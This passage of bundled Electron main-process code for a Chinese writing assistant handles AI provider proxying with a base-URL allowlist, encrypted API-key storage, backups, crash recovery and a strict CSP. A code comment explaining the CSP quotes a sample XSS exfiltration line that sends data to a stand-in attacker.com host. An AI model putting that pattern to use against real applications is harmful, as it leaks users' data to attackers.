
// electron/handlers/storage/index.ts
function registerStorageHandlers() {
  registerGlobalStorageHandlers();
  registerProjectStorageHandlers();
  registerFileStorageHandlers();
  registerDialogHandlers();
  registerFileExternalHandlers();
  registerMaterialAttachmentHandlers();
}

// electron/handlers/aiProxy.ts
var import_electron6 = require("electron");
var import_promises10 = __toESM(require("node:fs/promises"), 1);
var import_node_crypto4 = require("node:crypto");

// electron/handlers/aiProxy.logic.ts
var AI_PROXY_DEFAULT_MODEL_MAP = {
  local: "qwen2.5:7b",
  openai: "gpt-4o-mini",
  deepseek: "deepseek-chat"
};
var DEFAULT_BASE_URL_MAP = {
  local: "http://localhost:11434",
  openai: "https://api.openai.com",
  deepseek: "https://api.deepseek.com"
};
function buildAIProxyRequest(params, settings) {
  const { provider, messages, temperature, maxTokens, stream } = params;
  const usedModel = params.model || settings.model || AI_PROXY_DEFAULT_MODEL_MAP[provider] || "gpt-4o-mini";
  const baseUrl = params.baseUrl || settings.baseUrl || DEFAULT_BASE_URL_MAP[provider] || "";
  let url;
  let headers;
  if (provider === "local") {
    url = `${baseUrl}/api/chat`;
    headers = { "Content-Type": "application/json" };
  } else if (provider === "openai") {
    url = `${baseUrl}/v1/chat/completions`;
    headers = { "Content-Type": "application/json", Authorization: `Bearer ${settings.apiKey}` };
  } else if (provider === "deepseek") {
    url = `${baseUrl}/v1/chat/completions`;
    headers = { "Content-Type": "application/json", Authorization: `Bearer ${settings.apiKey}` };
  } else {
    throw new Error(`Unsupported provider: ${provider}`);
  }
  const bodyObj = provider === "local" ? { model: usedModel, messages, stream, options: { temperature, num_predict: maxTokens } } : { model: usedModel, messages, temperature, max_tokens: maxTokens, stream };
  return {
    url,
    headers,
    body: JSON.stringify(bodyObj),
    model: usedModel
  };
}
function parseAIProxyResponse(data, provider) {
  const d = data;
  const content = provider === "local" ? d?.message?.content : d?.choices?.[0]?.message?.content;
  if (!content || typeof content !== "string") {
    return { ok: false, error: `${provider} API: empty content` };
  }
  return { ok: true, content };
}

// electron/handlers/aiProxy.ts
var aiAbortControllers = /* @__PURE__ */ new Map();
function abortAllAIRequests() {
  for (const controller of aiAbortControllers.values()) {
    try {
      controller.abort();
    } catch {
    }
  }
  aiAbortControllers.clear();
}
function isAllowedAiBaseUrl(baseUrl, provider) {
  if (typeof baseUrl !== "string" || !baseUrl) return false;
  let url;
  try {
    url = new URL(baseUrl);
  } catch {
    return false;
  }
  const host = url.hostname;
  if (provider === "openai") {
    return url.protocol === "https:" && host === "api.openai.com";
  }
  if (provider === "deepseek") {
    return url.protocol === "https:" && host === "api.deepseek.com";
  }
  if (provider === "local") {
    return url.protocol === "http:" && (host === "localhost" || host === "127.0.0.1");
  }
  if (url.protocol === "https:") {
    return host === "api.openai.com" || host === "api.deepseek.com";
  }
  if (url.protocol === "http:") {
    return host === "localhost" || host === "127.0.0.1";
  }
  return false;
}
async function loadStoredAISettings() {
  try {
    const filePath = resolveFilePath("aiSettings");
    const data = await import_promises10.default.readFile(filePath, "utf-8");
    const settings = JSON.parse(data);
    let apiKey = "";
    if (settings.apiKey && import_electron6.safeStorage.isEncryptionAvailable()) {
      try {
        apiKey = import_electron6.safeStorage.decryptString(Buffer.from(settings.apiKey, "base64"));
      } catch (e) {
        logger.audit("security.crypto", "apiKey decrypt failed in loadSettings", { error: e instanceof Error ? e.message : String(e) });
        apiKey = "";
      }
    }
    return {
      apiKey,
      provider: settings.provider || "mock",
      baseUrl: settings.baseUrl || "",
      model: settings.model || "",
      temperature: settings.temperature ?? 0.7,
      maxTokens: settings.maxTokens ?? 2e3
    };
  } catch {
    return { apiKey: "", provider: "mock", baseUrl: "", model: "", temperature: 0.7, maxTokens: 2e3 };
  }
}
function registerAISettingsHandlers() {
  safeIpcHandle("ai:loadSettings", async () => {
    try {
      const filePath = resolveFilePath("aiSettings");
      const exists = await pathExists(filePath);
      if (!exists) return null;
      const raw = await import_promises10.default.readFile(filePath, "utf-8");
      const settings = JSON.parse(raw);
      if (settings.apiKey && typeof settings.apiKey === "string") {
        try {
          const encrypted = Buffer.from(settings.apiKey, "base64");
          import_electron6.safeStorage.decryptString(encrypted);
          settings.apiKey = "configured";
          settings.hasApiKey = true;
        } catch {
          logger.audit("security.crypto", "ai:loadSettings: decrypt apiKey failed", { provider: settings.provider });
          settings.apiKey = "";
          settings.hasApiKey = false;
        }
      } else {
        settings.apiKey = "";
        settings.hasApiKey = false;
      }
      return settings;
    } catch (e) {
      logger.error("ai:loadSettings error", e instanceof Error ? e : { error: String(e) });
      return null;
    }
  });
  safeIpcHandle("ai:saveSettings", async (_event, settings) => {
    try {
      if (!settings || typeof settings !== "object") return false;
      const VALID_PROVIDERS = /* @__PURE__ */ new Set(["mock", "local", "openai", "deepseek"]);
      if (typeof settings.provider !== "string" || !VALID_PROVIDERS.has(settings.provider)) {
        logger.audit("security.input", "ai:saveSettings rejected: invalid provider", { provider: settings.provider });
        return false;
      }
      if (typeof settings.temperature !== "number" || !Number.isFinite(settings.temperature)) {
        logger.audit("security.input", "ai:saveSettings rejected: invalid temperature");
        return false;
      }
      if (typeof settings.maxTokens !== "number" || !Number.isFinite(settings.maxTokens)) {
        logger.audit("security.input", "ai:saveSettings rejected: invalid maxTokens");
        return false;
      }
      if (typeof settings.apiKey !== "string" || typeof settings.baseUrl !== "string" || typeof settings.model !== "string") {
        logger.audit("security.input", "ai:saveSettings rejected: invalid field types");
        return false;
      }
      let encryptedBase64 = "";
      if (settings.apiKey && import_electron6.safeStorage.isEncryptionAvailable()) {
        try {
          const encrypted = import_electron6.safeStorage.encryptString(settings.apiKey);
          encryptedBase64 = encrypted.toString("base64");
        } catch {
          logger.audit("security.crypto", "ai:saveSettings: encrypt apiKey failed", { provider: settings.provider });
        }
      }
      const storedSettings = { ...settings, apiKey: encryptedBase64 };
      const filePath = resolveFilePath("aiSettings");
      return await withWriteMutex(filePath, async () => {
        await ensureDir(filePath);
        const tmp = `${filePath}.${(0, import_node_crypto4.randomUUID)()}.tmp`;
        try {
          await import_promises10.default.writeFile(tmp, JSON.stringify(storedSettings), "utf-8");
          await import_promises10.default.rename(tmp, filePath);
          return true;
        } finally {
          await import_promises10.default.unlink(tmp).catch(() => {
          });
        }
      });
    } catch (e) {
      logger.error("ai:saveSettings error", e instanceof Error ? e : { error: String(e) });
      return false;
    }
  });
}
function registerAIProxyHandlers() {
  safeIpcHandle("ai:proxyStream", async (event, params) => {
    const validationError = validateAIProxyParams(params);
    if (validationError) {
      logger.audit("security.input", "ai:proxyStream rejected: invalid params", { error: validationError });
      throw new Error(validationError);
    }
    const { provider, model, messages, temperature, maxTokens, requestId } = params;
    const stored = await loadStoredAISettings();
    const baseUrl = params.baseUrl || stored.baseUrl;
    if (baseUrl && !isAllowedAiBaseUrl(baseUrl, provider)) {
      logger.audit("security.ssrf", "ai:proxyStream rejected: disallowed baseUrl", { baseUrl, provider });
      throw new Error("AI baseUrl \u4E0D\u5728\u5141\u8BB8\u5217\u8868\u5185");
    }
    const apiKey = stored.apiKey;
    const built = buildAIProxyRequest(
      { provider, baseUrl: params.baseUrl, model, messages, temperature, maxTokens, stream: true },
      { apiKey, baseUrl: stored.baseUrl, model: stored.model }
    );
    const url = built.url;
    const headers = built.headers;
    const abortController = new AbortController();
    aiAbortControllers.set(requestId, abortController);
    const onSenderDestroyed = () => abortController.abort();
    event.sender.once("destroyed", onSenderDestroyed);
    try {
      const res = await fetch(url, {
        method: "POST",
        headers,
        body: built.body,
        signal: abortController.signal
      });
      if (!res.ok) {
        const errText = await res.text().catch(() => "");
        logger.audit("ai.http", "AI provider returned non-2xx", { status: res.status, requestId });
        throw new Error(`HTTP ${res.status}: ${errText.slice(0, 200)}`);
      }
      const reader = res.body.getReader();
      const decoder = new TextDecoder();
      let sseBuffer = "";
      let fullContent = "";
      const extractChunk = (data) => {
        if (data === "[DONE]") return "";
        try {
          const json = JSON.parse(data);
          return json.choices?.[0]?.delta?.content ?? json.message?.content ?? "";
        } catch {
          return "";
        }
      };
      while (true) {
        const { done, value } = await reader.read();
        if (done) break;
        sseBuffer += decoder.decode(value, { stream: true });
        const lines = sseBuffer.split("\n");
        sseBuffer = lines.pop() || "";
        for (const line of lines) {
          const trimmed = line.trim();
          if (!trimmed) continue;
          if (provider !== "local" && trimmed === "data: [DONE]") {
            sseBuffer = "";
            if (!event.sender.isDestroyed()) {
              event.sender.send(`ai:stream:done:${requestId}`, fullContent);
            }
            return fullContent;
          }
          if (provider === "local" && trimmed.startsWith("{")) {
            try {
              const data = JSON.parse(trimmed);
              if (data?.done) {
                sseBuffer = "";
                if (!event.sender.isDestroyed()) {
                  event.sender.send(`ai:stream:done:${requestId}`, fullContent);
                }
                return fullContent;
              }
            } catch {
            }
          }
          const dataStr = provider === "local" ? trimmed : trimmed.startsWith("data: ") ? trimmed.slice(6) : "";
          if (!dataStr) continue;
          const chunk = extractChunk(dataStr);
          if (chunk) {
            fullContent += chunk;
            if (!event.sender.isDestroyed()) {
              event.sender.send(`ai:stream:chunk:${requestId}`, chunk);
            }
          }
        }
      }
      const tail = sseBuffer.trim();
      if (tail) {
        if (provider !== "local" && tail === "data: [DONE]") {
          if (!event.sender.isDestroyed()) {
            event.sender.send(`ai:stream:done:${requestId}`, fullContent);
          }
          return fullContent;
        }
        const dataStr = provider === "local" ? tail : tail.startsWith("data: ") ? tail.slice(6) : "";
        if (dataStr) {
          const chunk = extractChunk(dataStr);
          if (chunk) {
            fullContent += chunk;
            if (!event.sender.isDestroyed()) {
              event.sender.send(`ai:stream:chunk:${requestId}`, chunk);
            }
          }
        }
      }
      if (!event.sender.isDestroyed()) {
        event.sender.send(`ai:stream:done:${requestId}`, fullContent);
      }
      return fullContent;
    } catch (e) {
      const isAbort = e instanceof Error && (e.name === "AbortError" || abortController.signal.aborted);
      if (isAbort) {
        if (!event.sender.isDestroyed()) {
          event.sender.send(`ai:stream:done:${requestId}`, "");
        }
        return "";
      }
      const msg = e instanceof Error ? e.message : String(e);
      if (!event.sender.isDestroyed()) {
        event.sender.send(`ai:stream:error:${requestId}`, msg);
      }
      logger.error("ai:proxyStream failed", {
        requestId,
        provider,
        model,
        error: msg
      });
      throw e;
    } finally {
      event.sender.off("destroyed", onSenderDestroyed);
      aiAbortControllers.delete(requestId);
    }
  });
  safeIpcHandle("ai:abort", (_event, requestId) => {
    if (typeof requestId !== "string" || !requestId || requestId.length > 128 || !/^[a-zA-Z0-9-]+$/.test(requestId)) {
      logger.audit("security.schema", "ai:abort rejected: invalid requestId");
      return false;
    }
    const controller = aiAbortControllers.get(requestId);
    if (controller) {
      controller.abort();
      aiAbortControllers.delete(requestId);
    }
    return true;
  });
  safeIpcHandle("ai:proxyLLM", async (event, params) => {
    const validationError = validateAIProxyLLMParams(params);
    if (validationError) {
      logger.audit("security.input", "ai:proxyLLM rejected: invalid params", { error: validationError });
      throw new Error(validationError);
    }
    const { provider, model, temperature, maxTokens, prompt, systemPrompt, requestId } = params;
    const stored = await loadStoredAISettings();
    const baseUrl = params.baseUrl || stored.baseUrl;
    if (baseUrl && !isAllowedAiBaseUrl(baseUrl, provider)) {
      logger.audit("security.ssrf", "ai:proxyLLM rejected: disallowed baseUrl", { baseUrl, provider });
      throw new Error("AI baseUrl \u4E0D\u5728\u5141\u8BB8\u5217\u8868\u5185");
    }
    const apiKey = stored.apiKey;
    const messages = [];
    if (systemPrompt) messages.push({ role: "system", content: systemPrompt });
    messages.push({ role: "user", content: prompt });
    const built = buildAIProxyRequest(
      { provider, baseUrl: params.baseUrl, model, messages, temperature, maxTokens, stream: false },
      { apiKey, baseUrl: stored.baseUrl, model: stored.model }
    );
    const url = built.url;
    const headers = built.headers;
    const abortController = new AbortController();
    aiAbortControllers.set(requestId, abortController);
    const onSenderDestroyed = () => abortController.abort();
    event.sender.once("destroyed", onSenderDestroyed);
    try {
      const res = await fetch(url, {
        method: "POST",
        headers,
        body: built.body,
        signal: abortController.signal
      });
      if (!res.ok) {
        const errText = await res.text().catch(() => "");
        logger.audit("ai.http", "AI provider returned non-2xx (proxyLLM)", { status: res.status, requestId });
        return { ok: false, error: `HTTP ${res.status}: ${errText.slice(0, 200)}`, status: res.status };
      }
      const data = await res.json();
      const parsed = parseAIProxyResponse(data, provider);
      if (!parsed.ok) {
        logger.audit("ai.http", "AI provider returned empty content (proxyLLM)", { requestId });
        return { ok: false, error: parsed.error };
      }
      return { ok: true, content: parsed.content };
    } catch (e) {
      const isAbort = e instanceof Error && (e.name === "AbortError" || abortController.signal.aborted);
      if (isAbort) {
        return { ok: true, content: "" };
      }
      const msg = e instanceof Error ? e.message : String(e);
      logger.error("ai:proxyLLM failed", {
        requestId,
        provider,
        model,
        error: msg
      });
      return { ok: false, error: msg };
    } finally {
      event.sender.off("destroyed", onSenderDestroyed);
      aiAbortControllers.delete(requestId);
    }
  });
}

// electron/handlers/logger.ts
function registerLoggerHandlers() {
  safeIpcHandle("logger:write", (_event, level, message, fields) => {
    const allowedLevels = /* @__PURE__ */ new Set(["debug", "info", "warn", "error"]);
    const lvl = typeof level === "string" && allowedLevels.has(level) ? level : "info";
    const msg = typeof message === "string" ? message : String(message ?? "");
    const f = fields && typeof fields === "object" && !Array.isArray(fields) ? fields : void 0;
    const taggedFields = { ...f, source: "renderer" };
    try {
      logger.write(lvl, msg, taggedFields);
    } catch {
    }
  });
}

// electron/handlers/exportFile.ts
var import_node_path12 = __toESM(require("node:path"), 1);
var import_promises11 = __toESM(require("node:fs/promises"), 1);

// electron/handlers/exportFile.logic.ts
function normalizeExportEncoding(encoding) {
  if (typeof encoding !== "string" || !encoding) return "utf-8";
  return encoding;
}
function buildExportWriteOptions(encoding) {
  return { encoding: normalizeExportEncoding(encoding) };
}
function decodeBase64ToBuffer(base64Data) {
  return Buffer.from(base64Data, "base64");
}

// electron/handlers/exportFile.ts
function registerExportFileHandlers() {
  safeIpcHandle("export:writeFile", async (_event, filePath, data, encoding) => {
    try {
      const pathCheck = await validatePathAndAudit(
        "export:writeFile",
        filePath,
        isSafeExportFilePath,
        getAllowedProjectFileRoots()
      );
      if (!pathCheck.ok) return false;
      const resolved = import_node_path12.default.resolve(filePath);
      await import_promises11.default.writeFile(resolved, data, buildExportWriteOptions(encoding));
      return true;
    } catch (e) {
      logger.error("export:writeFile failed", { error: e.message });
      return false;
    }
  });
  safeIpcHandle("export:writeFileBuffer", async (_event, filePath, base64Data) => {
    try {
      const pathCheck = await validatePathAndAudit(
        "export:writeFileBuffer",
        filePath,
        isSafeExportFilePath,
        getAllowedProjectFileRoots()
      );
      if (!pathCheck.ok) return false;
      const resolved = import_node_path12.default.resolve(filePath);
      await import_promises11.default.writeFile(resolved, decodeBase64ToBuffer(base64Data));
      return true;
    } catch (e) {
      logger.error("export:writeFileBuffer failed", { error: e.message });
      return false;
    }
  });
}

// electron/handlers/backup.ts
var import_node_path13 = __toESM(require("node:path"), 1);
var import_promises12 = __toESM(require("node:fs/promises"), 1);
var import_node_fs2 = __toESM(require("node:fs"), 1);
var autoBackupTimer = null;
function startAutoBackup() {
  if (autoBackupTimer) return;
  autoBackupTimer = setInterval(() => {
    void runAutoBackup().catch((err) => logger.error("Auto backup failed", err instanceof Error ? err : { error: String(err) }));
  }, 5 * 60 * 1e3);
  autoBackupTimer.unref?.();
}
function stopAutoBackup() {
  if (autoBackupTimer) {
    clearInterval(autoBackupTimer);
    autoBackupTimer = null;
  }
}
async function runAutoBackup() {
  const projectsDir = getProjectsDir();
  const backupsDir = getBackupsDir();
  try {
    await import_promises12.default.access(projectsDir);
  } catch {
    return;
  }
  const entries = await import_promises12.default.readdir(projectsDir, { withFileTypes: true });
  const projectDirs = entries.filter((e) => e.isDirectory()).map((e) => e.name);
  if (projectDirs.length === 0) return;
  await ensureDir(backupsDir);
  const dateStr = (/* @__PURE__ */ new Date()).toISOString().slice(0, 10);
  for (const projectId of projectDirs) {
    const projectDir = import_node_path13.default.join(projectsDir, projectId);
    const backupDir = import_node_path13.default.join(backupsDir, projectId, dateStr);
    try {
      const exists = await import_promises12.default.access(backupDir).then(() => true).catch(() => false);
      if (!exists) {
        await import_promises12.default.cp(projectDir, backupDir, { recursive: true });
      }
    } catch (err) {
      logger.warn("Backup failed for project", { projectId, error: err instanceof Error ? err.message : String(err) });
    }
  }
  await cleanupOldDatedBackups(7);
}
async function cleanupOldDatedBackups(days) {
  const backupsDir = getBackupsDir();
  try {
    await import_promises12.default.access(backupsDir);
  } catch {
    return;
  }
  const cutoff = Date.now() - days * 24 * 60 * 60 * 1e3;
  const projectEntries = await import_promises12.default.readdir(backupsDir, { withFileTypes: true });
  for (const projectEntry of projectEntries) {
    if (!projectEntry.isDirectory()) continue;
    const projectBackupDir = import_node_path13.default.join(backupsDir, projectEntry.name);
    const dateEntries = await import_promises12.default.readdir(projectBackupDir, { withFileTypes: true });
    for (const dateEntry of dateEntries) {
      if (!dateEntry.isDirectory()) continue;
      const dateMatch = dateEntry.name.match(/^(\d{4})-(\d{2})-(\d{2})$/);
      if (!dateMatch) continue;
      const backupDate = Date.UTC(Number(dateMatch[1]), Number(dateMatch[2]) - 1, Number(dateMatch[3]));
      if (backupDate < cutoff) {
        await import_promises12.default.rm(import_node_path13.default.join(projectBackupDir, dateEntry.name), { recursive: true, force: true }).catch(() => {
        });
      }
    }
  }
}
async function checkCrashRecovery() {
  const projectsDir = getProjectsDir();
  const recovered = [];
  if (await pathExists(projectsDir)) {
    const entries = await import_promises12.default.readdir(projectsDir, { withFileTypes: true });
    for (const entry of entries) {
      if (!entry.isDirectory()) continue;
      const projectDir = import_node_path13.default.join(projectsDir, entry.name);
      const mainFile = import_node_path13.default.join(projectDir, "main.json");
      const tmpFile = import_node_path13.default.join(projectDir, "main.json.tmp");
      try {
        const [mainStat, tmpStat] = await Promise.all([
          import_promises12.default.stat(mainFile).catch(() => null),
          import_promises12.default.stat(tmpFile).catch(() => null)
        ]);
        if (tmpStat && (!mainStat || tmpStat.mtimeMs > mainStat.mtimeMs)) {
          try {
            const tmpContent = await import_promises12.default.readFile(tmpFile, "utf-8");
            JSON.parse(tmpContent);
            await import_promises12.default.copyFile(tmpFile, mainFile);
            recovered.push(entry.name);
          } catch (parseErr) {
            logger.warn("Crash recovery: tmp file corrupted, deleting instead of recovering", { tmpFile, error: parseErr instanceof Error ? parseErr.message : String(parseErr) });
            await import_promises12.default.unlink(tmpFile).catch(() => {
            });
          }
        }
      } catch (err) {
        logger.warn("Crash recovery check failed for project", { project: entry.name, error: err instanceof Error ? err.message : String(err) });
      }
    }
  }
  await cleanupStaleTmpFiles().catch((err) => {
    logger.warn("Crash recovery: cleanup stale tmp files failed", { error: err instanceof Error ? err.message : String(err) });
  });
  return { recovered: recovered.length > 0, projects: recovered };
}
async function cleanupStaleTmpFiles() {
  const TMP_STALE_AGE_MS = 60 * 60 * 1e3;
  const roots = [getDataDir(), getProjectsDir()];
  for (const root of roots) {
    await scanTmpFilesRecursive(root, TMP_STALE_AGE_MS).catch((err) => {
      logger.warn("Crash recovery: scan root failed", { root, error: err instanceof Error ? err.message : String(err) });
    });
  }
}
async function scanTmpFilesRecursive(dir, staleAgeMs) {
  const entries = await import_promises12.default.readdir(dir, { withFileTypes: true }).catch(() => null);
  if (!entries) return;
  const now = Date.now();
  for (const entry of entries) {
    const fullPath = import_node_path13.default.join(dir, entry.name);
    if (entry.isDirectory()) {
      await scanTmpFilesRecursive(fullPath, staleAgeMs);
      continue;
    }
    if (!entry.isFile() || !entry.name.endsWith(".tmp")) continue;
    try {
      const stat = await import_promises12.default.stat(fullPath);
      if (now - stat.mtimeMs < staleAgeMs) continue;
      let looksValid = false;
      try {
        const content = await import_promises12.default.readFile(fullPath, "utf-8");
        JSON.parse(content);
        looksValid = true;
      } catch {
        looksValid = false;
      }
      if (looksValid) {
        logger.warn("Crash recovery: removing stale tmp (valid JSON, main file intact)", { fullPath });
      } else {
        logger.warn("Crash recovery: removing stale tmp (corrupted)", { fullPath });
      }
      await import_promises12.default.unlink(fullPath).catch(() => {
      });
    } catch (err) {
      logger.warn("Crash recovery: stat/unlink tmp failed", { fullPath, error: err instanceof Error ? err.message : String(err) });
    }
  }
}
function cleanupAllTmpSync() {
  const roots = [getDataDir(), getProjectsDir()];
  for (const root of roots) {
    try {
      cleanupTmpSync(root);
    } catch (e) {
      logger.warn("Quit cleanup: tmp failed", { root, error: e instanceof Error ? e.message : String(e) });
    }
  }
}
function cleanupTmpSync(dir, depth = 0) {
  if (depth > 3) return;
  let entries;
  try {
    entries = import_node_fs2.default.readdirSync(dir, { withFileTypes: true });
  } catch {
    return;
  }
  if (entries.length > 1e4) {
    logger.warn?.(`cleanupTmpSync: dir ${dir} has ${entries.length} entries, skipping`);
    return;
  }
  for (const entry of entries) {
    const fullPath = import_node_path13.default.join(dir, entry.name);
    if (entry.isDirectory()) {
      cleanupTmpSync(fullPath, depth + 1);
      continue;
    }
    if (entry.isFile() && entry.name.endsWith(".tmp")) {
      try {
        import_node_fs2.default.unlinkSync(fullPath);
      } catch {
      }
    }
  }
}
function registerBackupHandlers() {
  safeIpcHandle("system:checkCrashRecovery", async () => {
    try {
      return await checkCrashRecovery();
    } catch (e) {
      logger.error("checkCrashRecovery error", e instanceof Error ? e : { error: String(e) });
      return { recovered: false, projects: [] };
    }
  });
}

// electron/handlers/window.ts
var import_electron7 = require("electron");
var import_node_path14 = __toESM(require("node:path"), 1);
function createMenu() {
  const template = [
    {
      label: "\u6587\u4EF6",
      submenu: [
        { label: "\u65B0\u5EFA\u9879\u76EE", accelerator: "CmdOrCtrl+N" },
        { label: "\u6253\u5F00\u9879\u76EE", accelerator: "CmdOrCtrl+O" },
        { type: "separator" },
        { label: "\u4FDD\u5B58", accelerator: "CmdOrCtrl+S" },
        { label: "\u53E6\u5B58\u4E3A", accelerator: "CmdOrCtrl+Shift+S" },
        { type: "separator" },
        { label: "\u5BFC\u51FA", submenu: [
          { label: "\u5BFC\u51FA\u4E3A Markdown" },
          { label: "\u5BFC\u51FA\u4E3A Word" },
          { label: "\u5BFC\u51FA\u4E3A PDF" },
          { label: "\u5BFC\u51FA\u4E3A TXT" }
        ] },
        { type: "separator" },
        { label: "\u9000\u51FA", accelerator: "CmdOrCtrl+Q", role: "quit" }
      ]
    },
    {
      label: "\u7F16\u8F91",
      submenu: [
        { label: "\u64A4\u9500", accelerator: "CmdOrCtrl+Z", role: "undo" },
        { label: "\u91CD\u505A", accelerator: "CmdOrCtrl+Y", role: "redo" },
        { type: "separator" },
        { label: "\u526A\u5207", accelerator: "CmdOrCtrl+X", role: "cut" },
        { label: "\u590D\u5236", accelerator: "CmdOrCtrl+C", role: "copy" },
        { label: "\u7C98\u8D34", accelerator: "CmdOrCtrl+V", role: "paste" },
        { type: "separator" },
        { label: "\u641C\u7D22", accelerator: "CmdOrCtrl+F" },
        { label: "\u5168\u5C40\u641C\u7D22", accelerator: "CmdOrCtrl+K" }
      ]
    },
    {
      label: "\u89C6\u56FE",
      submenu: [
        { label: "\u5207\u6362\u5168\u5C4F", accelerator: "F11", role: "togglefullscreen" },
        { type: "separator" },
        { label: "\u4E3B\u9898", submenu: [
          { label: "\u6DF1\u8272\u6A21\u5F0F" },
          { label: "\u6D45\u8272\u6A21\u5F0F" }
        ] }
      ]
    },
    {
      label: "\u5E2E\u52A9",
      submenu: [
        { label: "\u4F7F\u7528\u624B\u518C" },
        { label: "\u5173\u4E8E\u7075\u7280\u5199\u4F5C\u52A9\u624B", role: "about" }
      ]
    }
  ];
  const menu = import_electron7.Menu.buildFromTemplate(template);
  import_electron7.Menu.setApplicationMenu(menu);
}
function createWindow(opts) {
  const { devServerUrl, distRenderer } = opts;
  const isDev = !!devServerUrl;
  const devOrigin = isDev ? new URL(devServerUrl).origin : "";
  const aiConnectSrc = "'self' https://api.openai.com https://api.deepseek.com http://localhost:* http://127.0.0.1:*";
  const devConnectExtra = isDev ? ` ${devOrigin} ws://localhost:* ws://127.0.0.1:*` : "";
  const csp = [
    "default-src 'self'",
    `script-src 'self'${isDev ? ` 'unsafe-inline' ${devOrigin}` : ""}`,
    "style-src 'self' 'unsafe-inline'",
    // img-src 不允许 https: 通配：防止 XSS 后用 new Image().src='https://attacker.com/?d='
    // 把数据通过 URL query 外泄（CSP connect-src 不拦截 <img> 请求）。
    // 用户附件已通过 file:readDataURL 转为 data: 内嵌，无需 https: 外链
    "img-src 'self' data: blob:",
    "font-src 'self' data:",
    `connect-src ${aiConnectSrc}${devConnectExtra}`,
    "media-src 'self' data: blob:",
    "object-src 'none'",
    "base-uri 'self'",
    "form-action 'self'",
    "frame-ancestors 'none'"
  ].join("; ");
  import_electron7.session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
    callback({
      responseHeaders: {
        ...details.responseHeaders,
        "Content-Security-Policy": [csp]
      }
    });
  });
  const mainWindow = new import_electron7.BrowserWindow({
    width: 1440,
    height: 900,
    minWidth: 1024,
    minHeight: 680,
    show: false,
    title: "\u7075\u7280\u5199\u4F5C\u52A9\u624B",
    backgroundColor: "#1a1a1a",
    autoHideMenuBar: true,
    titleBarStyle: process.platform === "darwin" ? "hiddenInset" : "default",
    webPreferences: {
      preload: import_node_path14.default.join(__dirname, "preload.cjs"),
      contextIsolation: true,
      nodeIntegration: false,
      // 显式启用 sandbox，限制渲染进程对 Node API 的访问，
      // 即使 preload 出现原型污染也无法直接拿到 require/process
      sandbox: true,
      // 显式声明安全默认值：防止未来 Electron 版本变更默认值引入回归
      // webSecurity: 同源策略 + file:// 协议限制（默认 true，关闭后渲染层可加载任意远程脚本）
      webSecurity: true,
      // allowRunningInsecureContent: 禁止 https 页面混入 http 子资源（默认 false）
      allowRunningInsecureContent: false,
      // experimentalFeatures: 关闭 Chromium 实验性 API（默认 false，开启可能引入未审计的攻击面）
      experimentalFeatures: false,
      // 禁用 enableBlinkFeatures 中可能被滥用的特性
      enableBlinkFeatures: void 0,
      // 禁用 dwfptq 等 webview 通道，强制走 BrowserWindow
      webviewTag: false,
      // 生产环境彻底禁用 DevTools：webPreferences.devTools=false 会让 Electron
      // 不响应 F12 / Ctrl+Shift+I / 菜单项 / webContents.openDevTools，
      // 从源头阻断生产环境用户或攻击者通过控制台执行任意 JS（可读取 store 内存数据、
      // 调用受限 IPC 等）。开发环境保留以便调试
      devTools: isDev
    }
  });
  setMainWindow(mainWindow);
  mainWindow.once("ready-to-show", () => {
    mainWindow.show();
  });
  mainWindow.on("closed", () => {
    setMainWindow(null);
  });
  mainWindow.webContents.setWindowOpenHandler(({ url }) => {
    try {
      const parsed = new URL(url);
      if (parsed.protocol !== "http:" && parsed.protocol !== "https:") {
        logger.audit("security.navigation", "setWindowOpenHandler blocked: non-http(s) protocol", { protocol: parsed.protocol });
        return { action: "deny" };
      }
      const ALLOWED_EXTERNAL_HOSTS = /* @__PURE__ */ new Set([
        "lingxi-writer.github.io",
        // 官方文档站
        "lingxi-writer.com",
        // 官网
        "github.com",
        // 项目仓库（Issue 反馈等）
        "lingxi-writer.docs"
        // 文档备用域名
      ]);
      if (!ALLOWED_EXTERNAL_HOSTS.has(parsed.hostname)) {
        logger.audit("security.navigation", "setWindowOpenHandler blocked: non-whitelisted host", { hostname: parsed.hostname });
        return { action: "deny" };
      }
      import_electron7.shell.openExternal(url);
    } catch {
      logger.audit("security.navigation", "setWindowOpenHandler blocked: invalid url");
    }
    return { action: "deny" };
  });
  mainWindow.webContents.on("will-navigate", (event, url) => {
    try {
      const parsed = new URL(url);
      if (isDev && parsed.origin === devOrigin) return;
      if (parsed.protocol === "file:") return;
      logger.audit("security.navigation", "will-navigate blocked", { url });
      event.preventDefault();
    } catch {
      logger.audit("security.navigation", "will-navigate blocked: invalid url");
      event.preventDefault();
    }
  });
  mainWindow.webContents.on("will-attach-webview", (event) => {
    logger.audit("security.navigation", "will-attach-webview blocked");
    event.preventDefault();
  });
  import_electron7.session.defaultSession.webRequest.onBeforeRequest((details, callback) => {
    if (details.resourceType === "serviceWorker") {
      logger.audit("security.sw", "Service Worker registration blocked", {
        url: details.url
      });
      callback({ cancel: true });
      return;
    }
    callback({});
  });
  import_electron7.session.defaultSession.setPermissionRequestHandler((_wc, permission, callback) => {
    logger.audit("security.permission", "Permission request denied", { permission });
    callback(false);
  });
  import_electron7.session.defaultSession.setPermissionCheckHandler(() => false);
  if (devServerUrl) {
    mainWindow.loadURL(devServerUrl);
  } else {
    mainWindow.loadFile(import_node_path14.default.join(distRenderer, "index.html"));
  }
}

// electron/main.ts
var VITE_DEV_SERVER_URL = process.env.VITE_DEV_SERVER_URL;
var DIST_ELECTRON = import_node_path15.default.join(__dirname, "..");
var DIST_RENDERER = import_node_path15.default.join(DIST_ELECTRON, "..", "dist");
var gotTheLock = import_electron8.app.requestSingleInstanceLock();
if (!gotTheLock) {
  import_electron8.app.quit();
} else {
  import_electron8.app.on("second-instance", () => {
    const mainWindow = getMainWindow();
    if (mainWindow) {
      if (mainWindow.isMinimized()) mainWindow.restore();
      mainWindow.focus();
    }
  });
  process.on("uncaughtException", (err) => {
    try {
      logger.error("uncaughtException", err);
    } catch {
      console.error("[FALLBACK] uncaughtException:", err);
    }
  });
  process.on("unhandledRejection", (reason) => {
    try {
      logger.error("unhandledRejection", {
        reason: reason instanceof Error ? `${reason.name}: ${reason.message}
${reason.stack || ""}` : String(reason)
      });
    } catch {
      console.error("[FALLBACK] unhandledRejection:", reason);
    }
  });
  try {
    import_electron8.app.setPath("crashDumps", import_node_path15.default.join(import_electron8.app.getPath("userData"), "logs", "crashes"));
    import_electron8.crashReporter.start({ uploadToServer: false });
  } catch (err) {
    console.error("[FALLBACK] crashReporter.start failed:", err);
  }
  import_electron8.app.whenReady().then(() => {
